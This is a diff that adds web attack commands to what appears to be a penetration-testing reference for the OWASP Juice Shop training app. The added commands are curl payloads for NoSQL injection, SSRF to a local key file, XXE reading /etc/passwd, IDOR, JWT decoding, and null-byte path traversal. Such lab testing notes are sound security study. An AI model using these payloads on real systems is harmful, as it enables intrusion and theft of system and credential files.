@@ -47,6 +47,24 @@ curl -X POST "<TARGET_URL>/rest/user/login" -H "Content-Type: application/json" 
 
 # Authenticated request
 curl -H "Authorization: Bearer <TOKEN>" "<TARGET_URL>/rest/user/whoami"
+
+# NoSQL injection testing (MongoDB operator injection)
+curl -X PATCH "<TARGET_URL>/rest/products/reviews" -H "Content-Type: application/json" -H "Authorization: Bearer <TOKEN>" -d '{"id":{"$ne":-1},"message":"test"}'
+
+# SSRF testing via profile image URL
+curl -X POST "<TARGET_URL>/profile/image/url" -H "Content-Type: application/json" -H "Authorization: Bearer <TOKEN>" -d '{"imageUrl":"http://localhost:3001/encryptionkeys/jwt.pub"}'
+
+# XXE testing via B2B orders
+curl -X POST "<TARGET_URL>/b2b/v2/orders" -H "Content-Type: application/xml" -H "Authorization: Bearer <TOKEN>" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><order><productId>&xxe;</productId></order>'
+
+# IDOR testing — access another user's basket
+curl -H "Authorization: Bearer <TOKEN>" "<TARGET_URL>/rest/basket/2"
+
+# JWT decode (base64)
+echo "<JWT_TOKEN>" | cut -d. -f2 | base64 -d 2>/dev/null
+
+# Path traversal with null byte bypass
+curl "<TARGET_URL>/ftp/eastere.gg%2500.md"
 ```
 
 ### File System (source code analysis)
